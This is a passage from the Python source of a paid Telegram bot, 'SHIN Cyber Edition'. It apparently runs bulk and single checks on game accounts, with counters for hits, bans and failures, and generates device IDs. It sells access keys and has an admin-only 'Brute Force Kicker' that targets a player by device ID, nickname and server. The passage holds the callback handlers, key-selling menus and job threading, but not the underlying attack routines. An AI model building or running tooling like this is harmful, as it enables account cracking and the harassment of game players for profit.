        await q.edit_message_text(render_bf_menu(), parse_mode="Markdown"); return

    if data == "tool_generate":
        auth, r = await user_manager.is_authorized(uid)
        if not auth: await q.edit_message_text(f"🚫 `{r}`", parse_mode="Markdown"); return
        await q.edit_message_text(render_generate_menu("mix"), parse_mode="Markdown",
            reply_markup=kb_generate_platform()); return

    if data.startswith("gen_set:"):
        auth, r = await user_manager.is_authorized(uid)
        if not auth: await q.edit_message_text(f"🚫 `{r}`", parse_mode="Markdown"); return
        platform = data.split(":", 1)[1]
        if platform not in ("and", "ios", "mix"): platform = "mix"
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_generate_count"] = True
            active_jobs[uid]["generate_platform"] = platform
        icon = {"and":"🤖","ios":"🍎","mix":"🎲"}.get(platform, "🎲")
        await q.edit_message_text(
            f"◇  *GENERATOR SETUP*  ◇\n{LINE_HEAVY}\n┣ {icon} Platform : `{platform.upper()}`\n"
            f"┣ 🔢 Range    : `1 - {MAX_GENERATE_COUNT:,}`\n┗ 📝 Send     : a number\n"
            f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown"); return

    if data == "gen_back":
        auth, r = await user_manager.is_authorized(uid)
        if not auth: await q.edit_message_text(f"🚫 `{r}`", parse_mode="Markdown"); return
        with job_lock:
            active_jobs.get(uid, {}).pop("awaiting_generate_count", None)
            active_jobs.get(uid, {}).pop("generate_platform", None)
        is_admin = (uid == OWNER_ID)
        await q.edit_message_text(render_menu(is_admin), parse_mode="Markdown",
            reply_markup=main_menu_kb(include_admin=is_admin)); return

    if data == "tool_stats":
        with COUNTER_LOCK:
            lines = [f"◇  *RANK HITS*  ◇\n{LINE_HEAVY}"]
            for r in ['warrior','elite','master','gm','epic','legend','mythic']:
                lines.append(f"┣ {r.capitalize():<10}: `{HIT_COUNTERS.get(r,0)}`")
            lines.append(f"┗ 👑 Sultan  : `{HIT_COUNTERS.get('sultan',0)}`")
            lines.append(LINE_HEAVY); lines.append(f"👑 {BRAND}")
        await q.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

    if data == "menu_buy":
        await q.edit_message_text(f"💳  *GET ACCESS*\n{LINE_HEAVY}\n"
            "┣ 3 Days     · ₱50\n┣ 7 Days     · ₱70\n┣ 1 Month    · ₱100\n┗ Lifetime   · ₱150\n"
            f"{LINE_HEAVY}\n📩 {BRAND}", parse_mode="Markdown"); return

    if data == "menu_help":
        admin_line = "┣ ⚡ Brute Force\n" if uid == OWNER_ID else ""
        await q.edit_message_text(f"◇  *HELP*  ◇\n{LINE_HEAVY}\n"
            "┣ 🔥 Bulk Check\n┣ 🔍 Single Check\n"
            f"{admin_line}"
            "┣ 🎲 Generate\n┣ 📊 Stats\n┗ 📖 Menu\n\n"
            "`/generate` · `/redeem` · `/start`\n"
            f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown"); return

    if data.startswith("stop_bf_"):
        if uid != OWNER_ID:
            await q.answer("Admin only.", show_alert=True); return
        target = int(data.split("_")[2])
        if uid == target or uid == OWNER_ID:
            with _bf_lock:
                ev = _bf_stop_flags.get(target)
                if ev: ev.set()
            await q.edit_message_text("🛑 Brute force stopped.")
        return

    if data.startswith("stop_") and not data.startswith("stop_bf_"):
        target = int(data.split("_")[1])
        if uid == target or uid == OWNER_ID:
            with job_lock:
                if target in active_jobs:
                    active_jobs[target]["stopped"] = True
                    ev = active_jobs[target].get("stop_event")
                    if ev: ev.set()
            await q.edit_message_text("🛑 Stopped.")
        return

    if data.startswith("bf_run:"):
        if uid != OWNER_ID:
            await q.answer("Admin only.", show_alert=True); return
        parts = data.split(":")
        if len(parts) < 3:
            await q.answer("Invalid BF data.", show_alert=True); return
        try:
            loops = int(parts[1]); delay = float(parts[2])
        except ValueError:
            await q.answer("Invalid BF mode.", show_alert=True); return

        with _bf_profiles_lock: profile = _bf_profiles.get(uid)
        if not profile:
            await q.edit_message_text("❌ Profile expired. Send a device ID again.", parse_mode="Markdown"); return

        with job_lock:
            if uid in active_jobs and active_jobs[uid].get("status") == "running":
                await q.edit_message_text("⚠️ Active job. Use /stop first."); return

        loop_label = f"{loops}x" if loops > 0 else "♾ Unlimited"
        prog_msg = await ctx.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚡  *BRUTE FORCE KICKER — {loop_label}*\n{LINE_HEAVY}\n\n"
                 f"👤 Target : `{_esc(profile['nickname'])}`\n"
                 f"🌐 Server : `{profile['gs_info']}`\n\n_Starting…_",
            parse_mode="Markdown")

        stop_ev = threading.Event()
        with _bf_lock: _bf_stop_flags[uid] = stop_ev

        bf_job = {
            "user_id": uid, "chat_id": update.effective_chat.id,
            "msg_id": prog_msg.message_id, "profile": profile,
            "loops": loops, "delay": delay,
            "stop_event": stop_ev, "status": "running",
        }
        with job_lock: active_jobs[uid] = bf_job

        loop_obj = asyncio.get_event_loop()
        threading.Thread(target=run_bf_job, args=(bf_job, loop_obj, ctx.application), daemon=True).start()
        await q.edit_message_text(f"⚡ Brute Force started ({loop_label}).")
        return

    if data == "bf_cancel":
        with _bf_profiles_lock: _bf_profiles.pop(uid, None)
        await q.edit_message_text("❌ Brute force cancelled."); return

    if data == "open_admin_panel":
        if uid != OWNER_ID: await q.answer("Admin only", show_alert=True); return
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔑 Gen Key", callback_data="adm_genkey"),
             InlineKeyboardButton("👥 Users", callback_data="adm_users")],
            [InlineKeyboardButton("📊 Stats", callback_data="adm_stats"),
             InlineKeyboardButton("⚡ Running", callback_data="adm_running")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast_help")]])
        await q.edit_message_text(f"◇  *ADMIN PANEL*  ◇\n{LINE_HEAVY}", reply_markup=kb, parse_mode="Markdown"); return

    if data == "adm_running":
        if uid != OWNER_ID: return
        with job_lock:
            running = [(k, dict(v)) for k, v in active_jobs.items()
                       if v.get("status") == "running" and "stats" in v]
        if not running:
            await q.edit_message_text("No active jobs."); return
        lines = [f"⚡ *RUNNING — {len(running)}*\n{LINE_HEAVY}"]
        for r_uid, rj in running:
            s = rj["stats"].snapshot()
            mode = rj.get("mode", "bulk")
            lines.append(f"`{r_uid}` [{mode}] — ✅{s['hits']} 🚫{s['banned']} ❌{s['failed']} ({s['checked']}/{s['total']})")
        await q.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

    if data == "adm_stats":
        if uid != OWNER_ID: return
        await cmd_stats(update, ctx); return

    if data == "adm_users":
        if uid != OWNER_ID: return
        users = await user_manager.get_all_users()
        lines = [f"👥 *Users ({len(users)})*", LINE_HEAVY]
        for u, i in list(users.items())[:30]:
            lines.append(f"`{u}` | exp={(i.get('key_expiry') or '—')[:10]}")
        await q.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

    if data == "adm_genkey":
        if uid != OWNER_ID: return
        await q.edit_message_text("Use `/genkey hours 24 1`", parse_mode="Markdown"); return

    if data == "adm_broadcast_help":
        if uid != OWNER_ID: return
        await q.edit_message_text("Use `/broadcast your message`", parse_mode="Markdown"); return

# ════════════════════════════════════════════════════════════════
# POST_INIT + MAIN
# ════════════════════════════════════════════════════════════════

async def post_init(app):
    cmds = [
        BotCommand("start", "Dashboard"), BotCommand("menu", "Show menu"),
        BotCommand("generate", "Generate device IDs"),
        BotCommand("redeem", "Redeem key"), BotCommand("stop", "Stop job (fast)"),
        BotCommand("status", "Status"), BotCommand("help", "Help"),
    ]
    await app.bot.set_my_commands(cmds)
    if OWNER_ID:
        await app.bot.set_my_commands(cmds + [
            BotCommand("bruteforce", "Brute Force Kicker (admin)"),
            BotCommand("admin", "Admin panel"),
            BotCommand("genkey", "Generate key"),
            BotCommand("ban_user", "Ban user"),
            BotCommand("unban_user", "Unban user"),
            BotCommand("stats", "Statistics"),
            BotCommand("broadcast", "Broadcast"),
        ], scope={"type": "chat", "chat_id": OWNER_ID})
    log.info(f"🚀 {BOT_NAME} v{BOT_VERSION} online — iOS + BF + fast-stop")

def main():
    req = HTTPXRequest(connect_timeout=TELEGRAM_CONNECT_TIMEOUT, read_timeout=TELEGRAM_READ_TIMEOUT,
                      write_timeout=TELEGRAM_WRITE_TIMEOUT, pool_timeout=TELEGRAM_POOL_TIMEOUT)
    app = Application.builder().token(BOT_TOKEN).request(req).post_init(post_init).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("generate", cmd_generate))
    app.add_handler(CommandHandler("bruteforce", cmd_bruteforce))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("ban_user", cmd_ban_user))
    app.add_handler(CommandHandler("unban_user", cmd_unban_user))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(handle_callback))
    log.info("🔥 Starting SHIN Cyber Edition v5.2 (BF edition)...")
    try:
        app.run_polling(bootstrap_retries=10, allowed_updates=Update.ALL_TYPES, drop_pending_updates=False)
    except NetworkError as e:
        log.error(f"Network: {e}. Retry in 5s..."); time.sleep(5); main()
    except Exception as e:
        log.error(f"Fatal: {e}"); sys.exit(1)

if __name__ == "__main__":
    main()